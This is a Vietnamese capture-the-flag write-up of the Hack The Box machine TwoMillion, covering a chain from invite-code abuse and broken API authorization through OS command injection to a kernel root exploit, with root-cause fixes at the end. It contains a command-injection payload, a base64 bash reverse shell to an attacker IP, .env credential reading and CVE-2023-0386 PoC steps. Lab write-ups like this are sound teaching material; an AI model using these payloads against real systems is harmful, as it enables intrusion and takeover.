---
title: HTB TwoMillion Walkthrough
date: 2026-02-21 22:00:00 +0700
categories: [CTF Writeup]
tags: [hackthebox, broken-authorization, command-injection, privilege-escalation, api-enumeration, credential-reuse]
pin: false
author: idkwhy07
---

> **Machine:** TwoMillion  
> **Operating system:** Linux  
> **Difficulty:** Easy  
> **Kỹ thuật chính:** JavaScript deobfuscation, API enumeration, broken authorization, OS command injection, credential reuse và Linux kernel privilege escalation.

## Tổng quan

TwoMillion mô phỏng lại một phiên bản cũ của nền tảng Hack The Box. Attack chain bắt đầu bằng việc reverse engineer quy trình tạo invite code, tiếp tục với một lỗi authorization trong authenticated API và kết thúc bằng việc khai thác lỗ hổng Linux kernel để leo thang lên `root`.

```text
Initial Enumeration
        ↓
Reverse Engineering Invite Workflow
        ↓
Authenticated API Enumeration
        ↓
Broken Function Level Authorization → Admin Role
        ↓
OS Command Injection → www-data Shell
        ↓
Credential Reuse → SSH as admin
        ↓
CVE-2023-0386 → Root
```

Từng bước trong TwoMillion đều không khó, nhưng ghép lại đủ tạo thành một chain hoàn chỉnh từ unauth đến root.

## Các kỹ thuật được sử dụng

- Kiểm tra và deobfuscate client-side JavaScript.
- Enumerate một authenticated REST API.
- Suy ra tham số request cần thiết dựa vào error message thay đổi qua từng lần gọi.
- Khai thác Broken Function Level Authorization để gọi API của admin.
- Khai thác OS command injection.
- Lateral movement thông qua credential reuse.
- Xác định và khai thác lỗ hổng Linux kernel để lên root.

## 1. Initial Enumeration

### 1.1. Quét dịch vụ bằng Nmap

Bắt đầu bằng default script scan và service version detection:

```bash
nmap -sC -sV -Pn 10.129.5.245
```

![Kết quả quét service và version bằng Nmap](/assets/img/twomillion/01-nmap-scan.png)

Kết quả cho thấy target mở SSH trên port `22` và HTTP trên port `80`. Web server chuyển hướng request tới virtual host `2million.htb`.

Thêm virtual host vào `/etc/hosts`:

```bash
echo '10.129.5.245 2million.htb' | sudo tee -a /etc/hosts
```

### 1.2. Kiểm tra web application

Truy cập `http://2million.htb` cho thấy một phiên bản cũ của nền tảng Hack The Box.

![Trang chủ](/assets/img/twomillion/dashboard.png)

Website có các chức năng login và registration, nhưng để đăng ký tài khoản cần có invite code, trang nhập invite code nằm tại `http://2million.htb/invite`:

![Chỉ dẫn vào trang invite của TwoMillion](/assets/img/twomillion/02-invite-page.png)

![Trang invite của TwoMillion](/assets/img/twomillion/invite-page.png)

## 2. Reverse Engineering quy trình Invite

### 2.1. Kiểm tra page source

Kiểm tra mã nguồn của trang invite, thấy trang tải một file JavaScript `inviteapi.min.js` đã bị obfuscate:

![Page source tải file inviteapi.min.js](/assets/img/twomillion/03-invite-script-source.png)

![File JavaScript đã bị obfuscate](/assets/img/twomillion/04-deobfuscated-javascript.png)

Sau khi deobfuscate và format script, thấy hai function đáng ngờ:

```javascript
function verifyInviteCode(code) {
  const formData = { code: code };

  $.ajax({
    type: "POST",
    dataType: "json",
    data: formData,
    url: "/api/v1/invite/verify",
    success: function (response) {
      console.log(response);
    },
    error: function (response) {
      console.log(response);
    },
  });
}

function makeInviteCode() {
  $.ajax({
    type: "POST",
    dataType: "json",
    url: "/api/v1/invite/how/to/generate",
    success: function (response) {
      console.log(response);
    },
    error: function (response) {
      console.log(response);
    },
  });
}
```

Đặc biệt function `makeInviteCode()` làm lộ endpoint `POST /api/v1/invite/how/to/generate`, có vẻ đây là endpoint hướng dẫn **cách tạo** invite code, không phải tạo trực tiếp.

### 2.2. Yêu cầu hướng dẫn tạo invite code

Gửi một `POST` request tới endpoint vừa tìm được:

```bash
curl -sX POST \
  http://2million.htb/api/v1/invite/how/to/generate | jq
```

Response trả về một thông điệp đã được encode bằng ROT13. Decode thông điệp này:

```bash
curl -sX POST \
  http://2million.htb/api/v1/invite/how/to/generate \
  | jq -r '.data.data' \
  | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

Sau khi decode thông điệp, nhận được chỉ dẫn tạo invite code bằng cách gửi request `POST` tới `/api/v1/invite/generate`.

### 2.3. Tạo invite code

Tạo invite code bằng cách gửi request `POST` tới `/api/v1/invite/generate` như chỉ dẫn:

```bash
curl -sX POST \
  http://2million.htb/api/v1/invite/generate | jq
```

Kết quả trả về được encode bằng Base64. Tiến hành decode Base64:

```bash
curl -sX POST \
  http://2million.htb/api/v1/invite/generate \
  | jq -r '.data.code' \
  | base64 -d
```

Nhập giá trị đã decode vào trang `invite` rồi đăng ký tài khoản.

![Đăng ký tài khoản trên TwoMillion](/assets/img/twomillion/07-registration.png)

## 3. Authenticated API Enumeration

### 3.1. Thu thập session cookie

Sau khi đăng nhập, website duy trì trạng thái xác thực bằng session cookie có tên `PHPSESSID`. Cookie này được trình duyệt tự động gửi trong các request tiếp theo tới `2million.htb`. Có thể capture cookie này bằng Burp Suite hoặc browser developer tools.

![PHP session cookie](/assets/img/twomillion/session-cookie.png)

Tại trang Access, ứng dụng gọi tới API `api/v1/user/vpn//generate` để tạo VPN configuration:

```http
GET api/v1/user/vpn//generate HTTP/1.1
Host: 2million.htb
Cookie: PHPSESSID=<SESSION_ID>
```

Dấu `//` trong đường dẫn gợi ý một path parameter đang bị bỏ trống — chi tiết này sẽ hữu ích khi enumerate các route khác dưới base path `/api/v1`.

### 3.2. Khám phá các API route

Tiếp tục gửi authenticated request tới API root kèm cookie:

```bash
curl -s \
  http://2million.htb/api/v1 \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

![Danh sách route của API v1](/assets/img/twomillion/09-api-routes.png)

Server trả về danh sách toàn bộ các API route được hỗ trợ, được phân loại theo HTTP method và nhóm chức năng, không chỉ mỗi user mà còn lộ cả các admin endpoint:

```
GET  /api/v1/admin/auth
POST /api/v1/admin/vpn/generate
PUT  /api/v1/admin/settings/update
```

Việc API trả về toàn bộ route giúp quá trình reconnaissance trở nên dễ dàng hơn. Trong trường hợp này, các administrative route vẫn có thể được tiếp cận vì authorization check được triển khai sai.

### 3.3. Xác minh role hiện tại

Kiểm tra xem tài khoản hiện tại có phải admin hay không:

```bash
curl -s \
  http://2million.htb/api/v1/admin/auth \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

Response xác nhận tài khoản hiện tại chỉ là normal user:

```json
{
  "message": false
}
```

## 4. Leo thang từ User lên Admin

### 4.1. Thăm dò settings endpoint

Route listing cho thấy `/api/v1/admin/settings/update` yêu cầu HTTP method `PUT`. Tiến hành thăm dò từng header để xác định cấu trúc request của endpoint này.

**Bước 1 — Request không có body:**

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

Thay vì trả về `401 Unauthorized`, endpoint báo lỗi thiếu `Content-Type`. Điều này cho thấy request đã đi tới handler dù account hiện tại không phải admin — một dấu hiệu tốt để tiếp tục khai thác.

**Bước 2 — Thêm `Content-Type: application/json`:**

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' | jq
```

Kết quả tiếp tục báo thiếu parameter `email`.

**Bước 3 — Cung cấp `email`:**

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"<YOUR_EMAIL>"}' | jq
```

Kết quả lần này làm lộ thêm field bắt buộc `is_admin`.

### 4.2. Thay đổi role

Gửi cả hai giá trị bắt buộc và đặt `is_admin` thành integer `1`:

```bash
curl -sX PUT \
  http://2million.htb/api/v1/admin/settings/update \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"email":"<YOUR_EMAIL>","is_admin":1}' | jq
```

Kết quả trả về lần này không báo lỗi hay thiếu tham số nào, điều này có thể có nghĩa là request đã được xử lý thành công. 

Kiểm tra lại role hiện tại thấy user thường đã trở thành admin:

```bash
curl -s \
  http://2million.htb/api/v1/admin/auth \
  --cookie 'PHPSESSID=<SESSION_ID>' | jq
```

Response:

```json
{
  "message": true
}
```

## 5. Initial Foothold thông qua Command Injection

### 5.1. Kiểm tra administrative VPN endpoint

Administrative VPN endpoint yêu cầu parameter `username`:

```bash
curl -sX POST \
  http://2million.htb/api/v1/admin/vpn/generate \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"username":"test"}'
```

Với một giá trị bình thường, endpoint trả về OpenVPN configuration. Điều này gợi ý rằng `username` được sử dụng trong quá trình tạo hoặc đọc một file trên operating system.

### 5.2. Xác nhận command execution

Kiểm tra xem shell metacharacter có được interpret hay không:

```bash
curl -sX POST \
  http://2million.htb/api/v1/admin/vpn/generate \
  --cookie 'PHPSESSID=<SESSION_ID>' \
  -H 'Content-Type: application/json' \
  -d '{"username":"test;id;"}'
```

Response chứa output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Kết quả này xác nhận tồn tại **OS command injection** và command được thực thi dưới quyền user `www-data`.

### 5.3. Nhận reverse shell

Khởi tạo listener trên attacking machine:

```bash
nc -lvnp 4444
```

Tạo Bash reverse-shell payload và encode bằng Base64:

```bash
echo 'bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/4444 0>&1' | base64 | tr -d '\n'
```

Gửi payload tới vulnerable endpoint:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "<PHPSESSID>" \
  -H "Content-Type: application/json" \
  --data '{"username":"test;echo <BASE64_PAYLOAD> | base64 -d | bash;"}'
```

Listener thành công nhận được shell dưới quyền `www-data`.

![Nhận reverse shell dưới quyền www-data](/assets/img/twomillion/12-reverse-shell.png)

## 6. Lateral Movement sang user admin

### 6.1. Đọc application environment file

Web root chứa file `.env`:

```bash
cd /var/www/html
ls -la
cat .env
```

File `.env` chứa tên người dùng và mật khẩu cơ sở dữ liệu:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Với thông tin đăng nhập vừa có được, thử kiểm tra file `/etc/passwd` để xem user `admin` có tồn tại trong hệ thống hay không:

```bash
cat /etc/passwd | grep admin
```

Kết quả user `admin` tồn tại trong hệ thống:

```text
admin:x:1000:1000::/home/admin:/bin/bash
```

### 6.2. Credential reuse

SSH vào hệ thống với user `admin` và lấy được `user flag`:

```bash
ssh admin@2million.htb
id
cat ~/user.txt
```

![SSH access dưới quyền user admin](/assets/img/twomillion/14-ssh-admin.png)

## 7. Linux Privilege Escalation

### 7.1. Đọc local mail

Theo gợi ý của machine, admin có thói quen kiểm tra mail hệ thống local. Trong hộp thư của user `admin`, tìm thấy một email từ `ch4p` đề cập đến việc vá lỗi hệ điều hành:

```bash
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather

```

Nội dung email cảnh báo về các Linux kernel vulnerability, đồng thời đề cập cụ thể tới OverlayFS và FUSE.

### 7.2. Kiểm tra kernel và distribution

Enumerate kernel đang chạy:

```bash
uname -a
```

Kiểm tra distribution release:

```bash
lsb_release -a
```

Từ hai lệnh trên, thu thập được thông tin hệ thống:

```text
Kernel: 5.15.70-051570-generic
Distribution: Ubuntu 22.04.2 LTS
Codename: jammy
```

Từ thông tin trong local mail, kernel version và distribution release kết hợp lại, tìm kiếm được chính xác lỗ hổng `CVE-2023-0386` và tiến hành chuẩn bị PoC.

### 7.3. Chuẩn bị Proof of Concept

Trên attacking machine, clone repository chứa PoC và nén lại:

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386.git
zip -r cve.zip CVE-2023-0386
```

Upload archive sang target qua SSH:

```bash
scp cve.zip admin@2million.htb:/tmp/
```

Trên target, giải nén và build:

```bash
cd /tmp
unzip cve.zip
cd CVE-2023-0386
make all
```

### 7.4. Chạy exploit

Khởi chạy FUSE component ở background:

```bash
./fuse ./ovlcap/lower ./gc &
```

Chạy exploit binary:

```bash
./exp
```

PoC được thực thi thành công, kiểm tra user hiện tại đã lên quyền root:

```bash
id
```

Kết quả:

```text
uid=0(root) gid=0(root) groups=0(root),1000(admin)
```

Lấy được root flag:

```bash
cat /root/root.txt
```

![Root shell sau khi khai thác CVE-2023-0386](/assets/img/twomillion/root-shell.png)

## 8. Root Cause Analysis

> Các source code snippet dưới đây được đưa vào để phân tích root cause sau exploitation, dựa trên official walkthrough. Những đoạn code này giúp giải thích nguyên nhân của hành vi đã quan sát được; chúng không bắt buộc phải được tìm thấy trong quá trình khai thác ban đầu.

### 8.1. Broken Authorization

Vulnerable controller thực hiện authorization check tương tự:

```php
$isAdmin = $this->is_admin($router);

if (!$isAdmin) {
    return header("HTTP/1.1 401 Unauthorized");
}
```

Tuy nhiên, `is_admin()` lại trả về JSON thay vì Boolean:

```php
return json_encode(["message" => false]);
```

Giá trị thực tế được trả về là một non-empty string:

```json
{"message":false}
```

Trong PHP, một non-empty string được đánh giá là `truthy`. Vì vậy:

```php
!$isAdmin
```

sẽ được đánh giá thành `false`, khiến execution tiếp tục mặc dù JSON message cho biết user không phải administrator.

Lỗi xảy ra vì helper function trả về JSON string thay vì Boolean. Nếu function trả về đúng kiểu Boolean, non-empty string sẽ không thể bypass conditional check.

Ví dụ:

```php
private function currentUserIsAdmin(): bool
{
    // Return true or false.
}
```

### 8.2. OS Command Injection

Vulnerable code xây dựng shell command bằng untrusted input:

```php
$output = shell_exec(
    "/usr/bin/cat /var/www/html/VPN/user/$username.ovpn"
);
```

Nếu `username` chứa shell separator như `;`, shell sẽ interpret phần nội dung còn lại thành một command riêng biệt.

Injection xảy ra vì `$username` được interpolate trực tiếp vào command do shell xử lý. Thay thế shell call bằng direct file access sẽ loại bỏ shell interpretation khỏi code path này.

```php
$path = "/var/www/html/VPN/user/" . $safeUsername . ".ovpn";
$output = file_get_contents($path);
```

Ngoài ra, có thể áp dụng allowlist để giới hạn format hợp lệ của username:

```
^[A-Za-z0-9_-]{1,32}$
```

## 9. Tổng hợp lỗ hổng

| Giai đoạn | Điểm yếu | Tác động | Phân loại | CWE/CVE |
|---|---|---|---|---|
| Invite workflow | Client-callable invite-generation workflow | Cho phép đăng ký account | Insecure Design | CWE-656 |
| Role escalation | Authorization helper trả về truthy JSON string | Normal user trở thành administrator | Broken Function Level Authorization | CWE-285 |
| VPN generation | Untrusted `username` đi vào `shell_exec()` | Remote command execution dưới quyền `www-data` | OS Command Injection | CWE-78 |
| Lateral movement | Database credential được reuse cho local account | SSH access dưới quyền `admin` | Credential Reuse | CWE-255 |
| Privilege escalation | Linux kernel tồn tại lỗ hổng OverlayFS/FUSE | Root access | Kernel Exploit | CVE-2023-0386 |

## 10. Kết luận

Chain của TwoMillion đi từ invite workflow lộ cách tạo account, qua authorization check sai ở API, đến command injection ngay trên endpoint admin.

Có shell www-data xong thì mọi thứ khá nhanh: .env lộ credential DB, credential đó tái dùng để SSH vào admin, và kernel cũ thì dính sẵn CVE để lên root.

Phần mình thích nhất là đoạn enumerate API. Mỗi lần thiếu gì, response lại lộ thêm một field bắt buộc — content type, tên parameter, kiểu dữ liệu. Cứ theo dấu vậy là đoán được request đang đi tới đâu trong handler và backend validate theo thứ tự nào.

## Lời cảm ơn

Cảm ơn Hack The Box và đội ngũ đã tạo ra TwoMillion — một machine được thiết kế rất khéo, mỗi bước đều dạy một bài học riêng chứ không chỉ đơn thuần là nối chuỗi khai thác.

Cảm ơn cộng đồng CTF và những anh/chị đã chia sẻ kiến thức, tài liệu để mình có thể đối chiếu và hiểu sâu hơn về root cause của từng lỗ hổng trong quá trình hoàn thành máy này.

Và cảm ơn bạn đã đọc đến tận đây. Nếu thấy bài viết hữu ích hoặc có góp ý gì, mình luôn sẵn sàng lắng nghe.

## Tài liệu tham khảo

- [CVE-2023-0386 Proof of Concept của xkaneiki](https://github.com/xkaneiki/CVE-2023-0386)
- [OWASP API Security — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [CWE-78 — Improper Neutralization of Special Elements Used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- Hack The Box official TwoMillion walkthrough